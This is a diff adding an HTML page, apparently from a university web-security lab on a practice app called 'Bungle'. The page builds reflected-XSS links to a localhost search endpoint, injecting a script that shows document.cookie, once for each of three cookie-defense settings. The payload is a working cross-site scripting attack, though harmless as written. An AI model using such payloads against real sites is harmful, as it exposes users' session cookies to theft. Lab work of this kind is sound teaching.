@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <title>Bungle XSS 3.0</title>
+</head>
+
+<body>
+
+    <h3>Try Bungle with each cookie configuration:</h3>
+    <div id="bungle-links"></div>
+
+    <script>
+        // The 3.0 payload demonstrates reflected XSS by reading the cookie from JavaScript.
+        function payload() {
+            alert(document.cookie);
+        }
+
+        // Put the payload in q and encode it so it survives the URL query string.
+        function makeLink(csrfdefense, xssdefense, target) {
+            var injectedScript = "<script>" +
+                payload.toString() +
+                ";payload()<\/script>";
+
+            return target + "search?xssdefense=" + xssdefense +
+                "&csrfdefense=" + csrfdefense +
+                "&q=" + encodeURIComponent(injectedScript);
+        }
+
+        // Use the three cookie configurations required by parts (a), (b), and (c).
+        var target = "http://localhost/project2/";
+        var linksContainer = document.getElementById("bungle-links");
+        var csrfdefenses = [1, 2, 3];
+
+        csrfdefenses.forEach(function (csrfdefense) {
+            // The XSS defense stays at 0; only the cookie flag changes between links.
+            var url = makeLink(csrfdefense, 0, target);
+            var link = document.createElement("a");
+            var line = document.createElement("p");
+
+            link.href = url;
+            link.textContent = "Try Bungle (csrfdefense=" + csrfdefense + ")";
+            line.appendChild(link);
+            linksContainer.appendChild(line);
+        });
+    </script>
+
+</body>
+
+</html>
